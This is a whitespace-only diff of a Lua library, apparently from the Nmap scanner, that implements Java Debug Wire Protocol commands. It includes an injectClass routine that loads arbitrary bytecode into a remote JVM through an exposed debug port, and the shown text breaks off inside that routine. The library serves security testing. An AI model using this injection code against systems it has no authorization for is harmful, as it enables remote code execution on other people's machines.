@@ -1,20 +1,20 @@
---- JDWP (Java Debug Wire Protocol) library implementing a set of commands needed to 
---  use remote debugging port and inject java bytecode. 
+--- JDWP (Java Debug Wire Protocol) library implementing a set of commands needed to
+--  use remote debugging port and inject java bytecode.
 --
--- There are two basic packet types in JDWP protool. 
--- Command packet and reply packet. Command packets are sent by 
+-- There are two basic packet types in JDWP protool.
+-- Command packet and reply packet. Command packets are sent by
 -- a debugger to a remote port which replies with a reply packet.
--- 
--- Simple handshake is needed to start the communication. 
+--
+-- Simple handshake is needed to start the communication.
 -- The debugger sends a "JDWP-Handshake" string and gets the same as a reply.
 -- Each (command and reply packet) has an id field since communication can be asynchronous.
 -- Packet id can be monothonicaly increasing.
 -- Although communication can be asynchronous, it is not (at least in my tests) so the same
--- packet id can be used for all communication. 
--- 
+-- packet id can be used for all communication.
+--
 -- To start the connection, script should call <code>jdwp.connect()</code> which returns success
 -- status and a socket. All other protocol functions require a socket as their first parameter.
--- 
+--
 -- Example of initiating connection:
 -- <code>
 -- local status,socket = jdwp.connect(host,port)
@@ -27,7 +27,7 @@
 --
 -- References:
 -- * http://docs.oracle.com/javase/6/docs/technotes/guides/jpda/jdwp-spec.html
--- 
+--
 --@copyright Same as Nmap--See http://nmap.org/book/man-legal.html
 --@author Aleksandar Nikolic
 --
@@ -42,7 +42,7 @@ local nmap = require "nmap"
 
 _ENV = stdnse.module("jdwp", stdnse.seeall)
 
--- JDWP protocol specific constants 
+-- JDWP protocol specific constants
 JDWP_CONSTANTS = {
 	handshake = "JDWP-Handshake" -- Connection initialization handshake
 }
@@ -105,7 +105,7 @@ ERROR_CODES = {
 	[509] = "TRANSPORT_LOAD Unable to load the transport.",
 	[510] = "TRANSPORT_INIT Unable to initialize the transport.",
 	[511] = "NATIVE_METHOD",
-	[512] = "INVALID_COUNT The count is invalid."	
+	[512] = "INVALID_COUNT The count is invalid."
 }
 
 -- JDWP protocol Command packet as described at
@@ -123,17 +123,17 @@ JDWPCommandPacket = {
 			data = data
 		}
        	setmetatable(o, self)
-        self.__index = self		
+        self.__index = self
 		return o
 	end,
-	
+
 	-- Packs command packet as a string od bytes, ready to be sent
 	-- to the target debugee.
 	pack = function(self)
 		local packed_packet
-		if self.data == nil then 
+		if self.data == nil then
 			packed_packet = bin.pack(">I",11) -- lenght - minimal header is 11 bytes
-		else 
+		else
 			packed_packet = bin.pack(">I",11 + #self.data) -- lenght with data
 		end
 		packed_packet = packed_packet .. bin.pack(">I",self.id)
@@ -147,7 +147,7 @@ JDWPCommandPacket = {
 	end
 }
 
--- JDWP protocol Reply packet as described at 
+-- JDWP protocol Reply packet as described at
 -- http://docs.oracle.com/javase/6/docs/technotes/guides/jpda/jdwp-spec.html
 -- Reply packets are recognized by 0x80 in flag field.
 JDWPReplyPacket = {
@@ -161,10 +161,10 @@ JDWPReplyPacket = {
 			data = data -- reply data, contents depend on the command
 		}
        	setmetatable(o, self)
-        self.__index = self		
+        self.__index = self
 		return o
 	end,
-	
+
 	-- Parses the reply into JDWPReplyPacket table.
 	parse_reply = function(self,reply_packet)
 		local pos,length,id,flags,error_code,data
@@ -172,21 +172,21 @@ JDWPReplyPacket = {
 		pos, id = bin.unpack(">I",reply_packet,pos)
 		pos, flags = bin.unpack(">C",reply_packet,pos)
 		pos, error_code = bin.unpack(">S",reply_packet,pos)
-		data = string.sub(reply_packet,pos)	
+		data = string.sub(reply_packet,pos)
 		if flags == 0x80 then
 			return true, JDWPReplyPacket:new(length,id,error_code,data)
 		end
 		stdnse.print_debug(2,"JDWP error parsing reply. Wrong reply packet flag. Raw data: ", stdnse.tohex(reply_packet))
 		return false, "JDWP error parsing reply."
 	end
-	
+
 }
 
 --- Negotiates the initial debugger-debugee handshake.
 --
 --@param host Host to connect to.
 --@param port Port to connect to.
---@return (status,socket) If status is false, socket is error message, otherwise socket is 
+--@return (status,socket) If status is false, socket is error message, otherwise socket is
 -- a newly created socket with initial handshake finished.
 function connect(host,port)
 	local status, result,err
@@ -195,7 +195,7 @@ function connect(host,port)
 	local status, err = socket:connect(host, port)
 	if not status then
 		stdnse.print_debug(2,"JDWP could not connect: %s",err)
-		return status, err 
+		return status, err
 	end
 	status, err = socket:send(JDWP_CONSTANTS.handshake)
 	if not status then
@@ -215,7 +215,7 @@ function connect(host,port)
 end
 
 --- Helper function to pack regular string into UTF-8 string.
--- 
+--
 --@param data String to pack into UTF-8.
 --@return utf8_string UTF-8 packed string. Four bytes lenght followed by the string its self.
 function toUTF8(data)
@@ -223,8 +223,8 @@ function toUTF8(data)
 	return utf8_string
 end
 
---- Helper function to read all Reply packed data which might be fragmented 
---  over multipe packets. 
+--- Helper function to read all Reply packed data which might be fragmented
+--  over multipe packets.
 --
 --@param socket Socket to receive from.
 --@return (status,data) If status is false, error string is returned, else data contains read ReplyPacket bytes.
@@ -238,17 +238,17 @@ function receive_all(socket)
 	while expected_length > #data do -- read until we get all the ReplyPacket data
 		status,result = socket:receive()
 		if not status then
-			return true, data -- if somethign is wrong,return partial data 
+			return true, data -- if somethign is wrong,return partial data
 		end
 		data = data .. result
 	end
-	return true,data 
+	return true,data
 end
 
 --- Helper function to extract ascii string from UTF-8
 --
 -- Writen in this way so it can be used interchangeably with bin.unpack().
--- 
+--
 --@param data Data from which to extract the string.
 --@param pos  Offset into data string where to begin.
 --@return (pos,ascii_string) Returns position where the string extraction ended and actuall ascii string.
@@ -268,32 +268,32 @@ end
 --- Helper function that sends the Command packet and parses the reply.
 --
 --@param socket Socket to use to send the command.
---@param command <code>JDWPCommandPacket</code> to send. 
+--@param command <code>JDWPCommandPacket</code> to send.
 --@return (status,data) If status is false, data contains specified error code message. If true, data contains data from the reply.
 function executeCommand(socket,command)
 	socket:send(command:pack())
 	local status, result = receive_all(socket)
 	if not status then
 		return false, "JDWP executeCommand() didn't get a reply."
-	end	
+	end
 	local reply_packet
-	status, reply_packet = JDWPReplyPacket:parse_reply(result)	
+	status, reply_packet = JDWPReplyPacket:parse_reply(result)
 	if not status then
 		return false, reply_packet
-	end		
+	end
 	if not (reply_packet.error_code == 0) then -- we have a packet with error , error code 0 means no error occured
 		return false, ERROR_CODES[reply_packet.error_code]
-	end	
+	end
 	local data = reply_packet.data
 	return true, data
 end
 
---- VirtualMachine Command Set (1) 
+--- VirtualMachine Command Set (1)
 --  Commands targeted at the debugggee virtual machine.
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine
 
 
---- Version Command (1) 
+--- Version Command (1)
 --  Returns the JDWP version implemented by the target VM as a table.
 --
 --  Returns a table with following values:
@@ -303,10 +303,10 @@ end
 --  * 'vmVersion'   String representing version of the debuggee VM.
 --  * 'vmName' 		Name of the debuggee VM.
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_Version
--- 
+--
 --@param socket Socket to use to send the command.
---@param id 	 Packet id. 
---@return (status,version_info) If status is false, version_info is an error string, else it contains remote VM version info. 
+--@param id 	 Packet id.
+--@return (status,version_info) If status is false, version_info is an error string, else it contains remote VM version info.
 function getVersion(socket,id)
 	local command = JDWPCommandPacket:new(id,1,1,nil) -- Version Command (1)
 	local status, data = executeCommand(socket,command)
@@ -332,17 +332,17 @@ end
 
 --- Classes by Signature command (2)
 --  Returns reference types for all the classes loaded by the target VM which match the given signature.
--- 
+--
 --  Given the class signature (like "Ljava/lang/Class") returns it's reference ID which can be used to reference that class
 --  in other commands. Returns a list of tables containing following values:
 --  * 'refTypeTag' JNI type tag
---  * 'referenceTypeID' Reference type of the class 
+--  * 'referenceTypeID' Reference type of the class
 --  * 'status' Current class status.
 -- 	http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_ClassesBySignature
 --
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
---@param signature Signature of the class. 
+--@param id 	 	Packet id.
+--@param signature Signature of the class.
 --@return (status,classes) If status is false, classes is an error string, else it contains list of found classes.
 function getClassBySignature(socket,id,signature)
 	local command = JDWPCommandPacket:new(id,1,2,toUTF8(signature))
@@ -356,11 +356,11 @@ function getClassBySignature(socket,id,signature)
 	local pos,number_of_classes = bin.unpack(">i",data)
 
 	for i = 1, number_of_classes do
-		local class_info = { 
+		local class_info = {
 			refTypeTag = nil,
 			referenceTypeID = nil,
 			status = nil
-		}	
+		}
 		pos, class_info.refTypeTag = bin.unpack("c",data,pos)
 		pos, class_info.referenceTypeID = bin.unpack(">L",data,pos)
 		pos, class_info.status = bin.unpack(">i",data,pos)
@@ -369,13 +369,13 @@ function getClassBySignature(socket,id,signature)
 	return true, classes
 end
 
---- AllThreads Command (4) 
+--- AllThreads Command (4)
 --  Returns all threads currently running in the target VM .
 --
 -- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_AllThreads
 --
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
+--@param id 	 	Packet id.
 --@return (status, threads) If status is false threads contains an error string, else it conatins a list of all threads in the debuggee VM.
 function getAllThreads(socket,id)
 	local command = JDWPCommandPacket:new(id,1,4,nil)
@@ -387,7 +387,7 @@ function getAllThreads(socket,id)
 	-- parse data
 	local pos,number_of_threads = bin.unpack(">i",data)
 	local threads = {}
-	for i = 1, number_of_threads do 
+	for i = 1, number_of_threads do
 		local thread
 		pos, thread = bin.unpack(">L",data,pos)
 		table.insert(threads,thread)
@@ -395,13 +395,13 @@ function getAllThreads(socket,id)
 	return true, threads
 end
 
---- Resume Command (9) 
+--- Resume Command (9)
 --  Resumes execution of the application after the suspend command or an event has stopped it.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_Resume
--- 
+--
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
+--@param id 	 	Packet id.
 --@return (status, nil) If status is false error string is returned, else it's null since this command has no data in the reply.
 function resumeVM(socket,id)
 	local command = JDWPCommandPacket:new(id,1,9,nil)
@@ -409,9 +409,9 @@ function resumeVM(socket,id)
 	if not status then
 		stdnse.print_debug(2,"JDWP resumeVM() error: %s", data)
 		return false,data
-	end	
+	end
 	-- wait for event notification
-	status, data = receive_all(socket)	
+	status, data = receive_all(socket)
 	if not status then
 		stdnse.print_debug(2,"JDWP resumeVM() event notification failed: %s", data)
 	end
@@ -424,7 +424,7 @@ end
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_CreateString
 --
 --@param socket 				Socket to use to send the command.
---@param id 	 				Packet id. 
+--@param id 	 				Packet id.
 --@param ascii_string			String to create.
 --@return (status, stringID) 	If status is false error string is returned, else stringID is newly created string.
 function createString(socket,id,ascii_string)
@@ -433,24 +433,24 @@ function createString(socket,id,ascii_string)
 	if not status then
 		stdnse.print_debug(2,"JDWP createString() error: %s", data)
 		return false,data
-	end	
+	end
 	local _,stringID = bin.unpack(">L",data)
 	return true, stringID
 end
 
 --- AllClassesWithGeneric Command (20)
 --  Returns reference types and signatures for all classes currently loaded by the target VM.
---  
---  Returns a list of tables containing following info: 
---  * 'refTypeTag'  	   Kind of following reference type.   
---  * 'typeID'   		   Loaded reference type  
---  * 'signature'   	   The JNI signature of the loaded reference type.  
+--
+--  Returns a list of tables containing following info:
+--  * 'refTypeTag'  	   Kind of following reference type.
+--  * 'typeID'   		   Loaded reference type
+--  * 'signature'   	   The JNI signature of the loaded reference type.
 --  * 'genericSignature'   The generic signature of the loaded reference type or an empty string if there is none.
---  * 'status'   		   The current class status.   
+--  * 'status'   		   The current class status.
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_VirtualMachine_AllClassesWithGeneric
 --
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
+--@param id 	 	Packet id.
 --@return (status, all_classes) If status is false all_classes contains an error string, else it is a list of loaded classes information.
 function getAllClassesWithGeneric(socket,id)
 	local command = JDWPCommandPacket:new(id,1,20,nil)
@@ -462,7 +462,7 @@ function getAllClassesWithGeneric(socket,id)
 	-- parse data
 	local all_classes = {}
 	local pos,number_of_classes = bin.unpack(">i",data)
-	
+
 	for i = 0 , number_of_classes do
 		local class = {
 			refTypeTag = nil,
@@ -482,7 +482,7 @@ function getAllClassesWithGeneric(socket,id)
 	return true, all_classes
 end
 
---- ReferenceType Command Set (2) 
+--- ReferenceType Command Set (2)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ReferenceType
 
 
@@ -492,7 +492,7 @@ end
 -- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ReferenceType_SignatureWithGeneric
 --
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
+--@param id 	 	Packet id.
 --@param classID   Reference type id of the class to get the signature from.
 --@return (status, signature) If status is false signature contains an error string, else it is class signature (like "Ljava/lang/Class").
 function getSignatureWithGeneric(socket,id,classID)
@@ -512,14 +512,14 @@ end
 --
 --  Returns a list of tables containing following fields for each method:
 --  * 'methodID'			Method ID which can be used to call the method.
---  * 'name'				The name of the method.  
---  * 'signature'			The JNI signature of the method.  
---  * 'generic_signature'	The generic signature of the method, or an empty string if there is none.  
+--  * 'name'				The name of the method.
+--  * 'signature'			The JNI signature of the method.
+--  * 'generic_signature'	The generic signature of the method, or an empty string if there is none.
 --  * 'modBits'				The modifier bit flags (also known as access flags) which provide additional information on the method declaration.
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ReferenceType_MethodsWithGeneric
 --
 --@param socket 	Socket to use to send the command.
---@param id 	 	Packet id. 
+--@param id 	 	Packet id.
 --@param classID   Reference type id of the class to get the list of methods.
 --@return (status, signature) If status is false methods contains an error string, else it a list of methods information.
 function getMethodsWithGeneric(socket,id,classID)
@@ -529,7 +529,7 @@ function getMethodsWithGeneric(socket,id,classID)
 		stdnse.print_debug(2,"JDWP getMethodsWithGeneric() error : %s",data)
 		return false,data
 	end
-	-- parse data	
+	-- parse data
 	local methods = {}
 	local pos,number_of_methods = bin.unpack(">i",data)
 
@@ -540,7 +540,7 @@ function getMethodsWithGeneric(socket,id,classID)
 			signature = nil,
 			generic_signature = nil,
 			modBits = nil
-		}	
+		}
 		pos, method_info.methodID = bin.unpack(">i",data,pos)
 		pos,method_info.name = extract_string(data,pos)
 		pos, method_info.signature = extract_string(data,pos)
@@ -554,14 +554,14 @@ end
 --- ClassType Command Set (3)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ClassType
 
---- InvokeMethod Command (3) 
+--- InvokeMethod Command (3)
 --  Invokes a class' static method and returns the reply data.
--- 
+--
 --  Reply data can vary so parsing is left to the function caller.
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ClassType_InvokeMethod
 --
 --@param socket 		Socket to use to send the command.
---@param id 	 		Packet id. 
+--@param id 	 		Packet id.
 --@param classID   	Reference type id of the class.
 --@param methodID  	ID of the static method to call.
 --@numberOfArguments 	Number of method arguments.
@@ -575,7 +575,7 @@ function invokeStaticMethod(socket,id,classID,methodID,numberOfArguments,argumen
 	else
 		params = bin.pack(">Lii",classID,methodID,numberOfArguments) .. arguments .. bin.pack(">i",options)
 	end
-	
+
 	local command = JDWPCommandPacket:new(id,3,3,params)
 	local status, data = executeCommand(socket,command)
 	if not status then
@@ -586,16 +586,16 @@ function invokeStaticMethod(socket,id,classID,methodID,numberOfArguments,argumen
 end
 
 --- NewInstance Command (4)
---  Creates a new object of this type, invoking the specified constructor. 
+--  Creates a new object of this type, invoking the specified constructor.
 --  The constructor method ID must be a member of the class type.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ClassType_NewInstance
 --
 --@param socket 		Socket to use to send the command.
---@param id 	 		Packet id. 
+--@param id 	 		Packet id.
 --@param classID   	Reference type id of the class.
---@param threadID		The thread in which to invoke the constructor.  
---@param methodID  	The constructor to invoke.  
+--@param threadID		The thread in which to invoke the constructor.
+--@param methodID  	The constructor to invoke.
 --@numberOfArguments 	Number of constructor arguments.
 --@arguments			Already packed arguments.
 --@return (status, objectID) If status is false data contains an error string, else it contains a reference ID of the newly created object.
@@ -606,7 +606,7 @@ function newClassInstance(socket,id,classID,threadID,methodID,numberOfArguments,
 	else
 		params = bin.pack(">LLii",classID,threadID,methodID,numberOfArguments) .. arguments
 	end
-	
+
 	local command = JDWPCommandPacket:new(id,3,4,params)
 	local status, data = executeCommand(socket,command)
 	if not status then
@@ -621,16 +621,16 @@ function newClassInstance(socket,id,classID,threadID,methodID,numberOfArguments,
 	return true,objectID
 end
 
---- ArrayType Command Set (4) 
+--- ArrayType Command Set (4)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ArrayType
 
 --- NewInstance Command (1)
---	Creates a new array object of the specified type with a given length. 
+--	Creates a new array object of the specified type with a given length.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ArrayType_NewInstance
--- 
+--
 --@param socket 		Socket to use to send the command.
---@param id 	 		Packet id. 
+--@param id 	 		Packet id.
 --@param arrayType		The array type of the new instance as per JNI (http://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/types.html#wp9502).
 --@param length 	 	Length of the new array.
 --@return (status, arrayID) If status is false data contains an error string, else it contains a reference ID of the newly created array.
@@ -642,23 +642,23 @@ function newArrayInstance(socket,id,arrayType,length)
 		stdnse.print_debug(2,"JDWP newArrayInstance() error: %s", data)
 		return false,data
 	end
-	local pos,_ , tag, arrayID 
+	local pos,_ , tag, arrayID
 	pos, tag = bin.unpack("C",data)
 	_, arrayID = bin.unpack(">L",data,pos)
 	return true, arrayID
 end
 
---- ObjectReference Command Set (9) 
+--- ObjectReference Command Set (9)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ObjectReference
 
 --- ReferenceType Command (1)
---  Returns the runtime type of the object. The runtime type will be a class or an array. 
+--  Returns the runtime type of the object. The runtime type will be a class or an array.
 --
--- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ObjectReference_ReferenceType 
+-- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ObjectReference_ReferenceType
 --
 --@param socket 		Socket to use to send the command.
---@param id 	 		Packet id. 
---@param objectID		The ID of an object. 
+--@param id 	 		Packet id.
+--@param objectID		The ID of an object.
 --@return (status, runtime_type) If status is false runtime_type contains an error string, else it contains runtime type of an object.
 function getRuntimeType(socket,id,objectID)
 	local command = JDWPCommandPacket:new(id,9,1,bin.pack(">L",objectID))
@@ -666,35 +666,35 @@ function getRuntimeType(socket,id,objectID)
 	if not status then
 		stdnse.print_debug(2,"JDWP resumeVM() error: %s", data)
 		return false,data
-	end	
+	end
 	local _,tag,runtime_type = bin.unpack(">CL",data)
 	stdnse.print_debug("runtime type: %d",runtime_type)
 	return true,runtime_type
 end
 
---- InvokeMethod Command (6) 
---  Invokes a instance method with specified parameters. 
--- 
+--- InvokeMethod Command (6)
+--  Invokes a instance method with specified parameters.
+--
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ObjectReference_InvokeMethod
 --
 --@param socket 			Socket to use to send the command.
---@param id 	 			Packet id. 
---@param objectID			The ID of an object. 
---@param threadID			The thread in which to invoke.   
---@param classID			The class type.     
+--@param id 	 			Packet id.
+--@param objectID			The ID of an object.
+--@param threadID			The thread in which to invoke.
+--@param classID			The class type.
 --@param methodID			ID of the method to invoke.
---@param numberOfArguments	Number of method arguments. 
+--@param numberOfArguments	Number of method arguments.
 --@arguments				Already packed arguments.
 --@return (status, data) If status is false data contains an error string, else it contains a reply data and needs to be parsed manualy.
 function invokeObjectMethod(socket,id,objectID,threadID,classID,methodID,numberOfArguments,arguments)
 	local params
-	
+
 	if numberOfArguments == 0 then
 		params = bin.pack(">LLLii",objectID,threadID,classID,methodID,numberOfArguments)
 	else
 		params = bin.pack(">LLLii",objectID,threadID,classID,methodID,numberOfArguments) .. arguments
 	end
-	
+
 	local command = JDWPCommandPacket:new(id,9,6,params)
 	local status, data = executeCommand(socket,command)
 	if not status then
@@ -705,17 +705,17 @@ function invokeObjectMethod(socket,id,objectID,threadID,classID,methodID,numberO
 	return true,data
 end
 
---- StringReference Command Set (10) 
+--- StringReference Command Set (10)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_StringReference
 
 --- Value Command (1)
---  Returns the characters contained in the string. 
+--  Returns the characters contained in the string.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_StringReference_Value
 --
 --@param socket 			Socket to use to send the command.
---@param id 	 			Packet id. 
---@param stringID			The ID of a string to read. 
+--@param id 	 			Packet id.
+--@param stringID			The ID of a string to read.
 --@return (status, data) 	If status is false result contains an error string, else it contains read string.
 function readString(socket,id,stringID)
 	local command = JDWPCommandPacket:new(id,10,1,bin.pack(">L",stringID))
@@ -723,22 +723,22 @@ function readString(socket,id,stringID)
 	if not status then
 		stdnse.print_debug(2,"JDWP readString() error: %s", data)
 		return false,data
-	end	
+	end
 	local _,result = extract_string(data,0)
 	return true,result
 end
 
---- ThreadReference Command Set (11) 
+--- ThreadReference Command Set (11)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ThreadReference
 
 
 --- Name Command (1)
---  Returns the thread name. 
+--  Returns the thread name.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ThreadReference_Name
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param threadID					The ID of a thread.
 --@return (status, thread_name) 	If status is false thread_name contains an error string, else it contains thread's name.
 function getThreadName(socket,id,threadID)
@@ -751,16 +751,16 @@ function getThreadName(socket,id,threadID)
 	end
 	-- parse data
 	local _,thread_name = extract_string(data,0)
-	return true, thread_name	
+	return true, thread_name
 end
 
 --- Suspend Command (2)
---  Suspends the thread. 
+--  Suspends the thread.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ThreadReference_Suspend
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param threadID					The ID of a thread.
 --@return (status, thread_name) 	If status is false an error string is returned, else it's nil.
 function suspendThread(socket,id,threadID)
@@ -770,7 +770,7 @@ function suspendThread(socket,id,threadID)
 	if not status then
 		stdnse.print_debug(2,"JDWP suspendThread() error: %s", data)
 		return false,data
-	end	
+	end
 	return true, nil
 end
 
@@ -781,7 +781,7 @@ end
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ThreadReference_Status
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param threadID					The ID of a thread.
 --@return (status, thread_name) 	If status is false an error string is returned, else unparsed thread status data.
 function threadStatus(socket,id,threadID)
@@ -791,12 +791,12 @@ function threadStatus(socket,id,threadID)
 	if not status then
 		stdnse.print_debug(2,"JDWP threadStatus() error: %s", data)
 		return false,data
-	end	
+	end
 	stdnse.print_debug("threadStatus %s",stdnse.tohex(data))
 	return true, data
 end
 
---- ArrayReference Command Set (13) 
+--- ArrayReference Command Set (13)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ArrayReference
 
 --- SetValues Command (3)
@@ -805,7 +805,7 @@ end
 -- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ArrayReference_SetValues
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param objectID					The ID of an array object.
 --@return (status, data) 			If status is false an error string is returned, else it's nil.
 function setArrayValues(socket,id,objectID,idx,values)
@@ -816,18 +816,18 @@ function setArrayValues(socket,id,objectID,idx,values)
 		stdnse.print_debug(2,"JDWP setArrayValues() error: %s", data)
 		return false,data
 	end
-	return true, nil	
+	return true, nil
 end
 
---- EventRequest Command Set (15) 
+--- EventRequest Command Set (15)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_EventRequest
 
 --- Uses Set Command (1) to set singlesteping to specified thread.
--- 
+--
 -- http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_EventRequest_Set
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param threadID					The ID of the thread.
 --@return (status, requestID) 		If status is false an error string is returned, else it contains assigned request id.
 function setThreadSinglestep(socket,id,threadID)
@@ -837,9 +837,9 @@ function setThreadSinglestep(socket,id,threadID)
 	if not status then
 		stdnse.print_debug(2,"JDWP setThreadSinglestep() error: %s", data)
 		return false,data
-	end	
+	end
 	local _, requestID = bin.unpack(">i",data)
-	return true, requestID 
+	return true, requestID
 end
 
 --- Uses Clear Command (2) to unset singlesteping from a thread by specified event.
@@ -847,7 +847,7 @@ end
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_EventRequest_Clear
 --
 --@param socket 					Socket to use to send the command.
---@param id 	 					Packet id. 
+--@param id 	 					Packet id.
 --@param eventID					The ID of the thread.
 --@return (status, requestID) 		If status is false an error string is returned, else it's nil.
 function clearThreadSinglestep(socket,id,eventID)
@@ -857,21 +857,21 @@ function clearThreadSinglestep(socket,id,eventID)
 	if not status then
 		stdnse.print_debug(2,"JDWP clearThreadSinglestep() error: %s", data)
 		return false,data
-	end	
+	end
 	return true,nil
 end
 
---- ClassObjectReference Command Set (17) 
+--- ClassObjectReference Command Set (17)
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ClassObjectReference
 
 
 --- ReflectedType Command (1)
---  Returns the reference type reflected by this class object. 
+--  Returns the reference type reflected by this class object.
 --
 --  http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html#JDWP_ClassObjectReference_ReflectedType
 --
 --@param socket 						Socket to use to send the command.
---@param id 	 						Packet id. 
+--@param id 	 						Packet id.
 --@param classObjectID					The ID of the object.
 --@return (status, reflected_type) 		If status is false an error string is returned, else reflected_type is object's reference type.
 function getReflectedType(socket,id,classObjectID)
@@ -881,13 +881,13 @@ function getReflectedType(socket,id,classObjectID)
 	if not status then
 		stdnse.print_debug(2,"JDWP getReflectedType() error: %s", data)
 		return false,data
-	end	
+	end
 	local reflected_type = {
 		refTypeTag = nil,
 		typeID = nil
 	}
 	_,reflected_type.refTypeTag, reflected_type.typeID = bin.unpack(">CL",data)
-	
+
 	return true, reflected_type
 end
 
@@ -914,7 +914,7 @@ function findMethod(socket,class,methodName,skipFirst)
 				end
 			end
 		end
-	end	
+	end
 	return methodID
 end
 
@@ -948,7 +948,7 @@ function injectClass(socket,class_bytes)
 		return false
 	end
 	stdnse.print_debug("Found byte[] id %d",byteArrayID)
-	
+
 	-- find SecureClassLoader id by signature
 	status, classes = getClassBySignature(socket,0,"Ljava/security/SecureClassLoader;")
 	if not status then
@@ -956,19 +956,19 @@ function injectClass(socket,class_bytes)
 	end
 	local secureClassLoader = classes[1].referenceTypeID
 	stdnse.print_debug("Found SecureClassLoader id %d",secureClassLoader)
-	-- find SecureClassLoader() constructor 
+	-- find SecureClassLoader() constructor
 	local constructorMethodID = findMethod(socket,secureClassLoader,"<init>",true)
 	-- find ClassLoader id by signature
 	status, classes = getClassBySignature(socket,0,"Ljava/lang/ClassLoader;")
 	if not status then
 		return false
-	end		
+	end
 	local classLoader = classes[1].referenceTypeID
 	stdnse.print_debug("Found ClassLoader id %d",classes[1].referenceTypeID)
 	-- find ClassLoader's defineClass() method
 	local defineClassMethodID = findMethod(socket,classLoader,"defineClass",false)
 	-- find ClassLoader's resolveClass() method
-	local resolveClassMethodID = findMethod(socket,classLoader,"resolveClass",false)	
+	local resolveClassMethodID = findMethod(socket,classLoader,"resolveClass",false)
 	if constructorMethodID == nil or defineClassMethodID == nil or resolveClassMethodID == nil then
 		stdnse.print_debug("Either constructor, defineClass or resolveClass method could not be found %s,%s,%s", type(constructorMethodID), type(defineClassMethodID),type(resolveClassMethodID))
 		return false
@@ -976,13 +976,13 @@ function injectClass(socket,class_bytes)
 
 
 	-- create array to load bytecode into
-	local arrayID 
+	local arrayID
 	status, arrayID = newArrayInstance(socket,0,byteArrayID,#class_bytes)
 	if not status then
 		stdnse.print_debug("New array failed: %s", arrayID)
 		return false
 	end
-	stdnse.print_debug("Created new byte array of length %d",#class_bytes)	
+	stdnse.print_debug("Created new byte array of length %d",#class_bytes)
 	-- set array values
 	local temp
 	status, temp = setArrayValues(socket,0,arrayID,0,class_bytes)
@@ -990,12 +990,12 @@ function injectClass(socket,class_bytes)
 		stdnse.print_debug("Set values failed: %s", temp)
 		return
 	end
-	stdnse.print_debug("Set array values to injected class bytes")			
-	
-	-- get main thread id 
+	stdnse.print_debug("Set array values to injected class bytes")
+
+	-- get main thread id
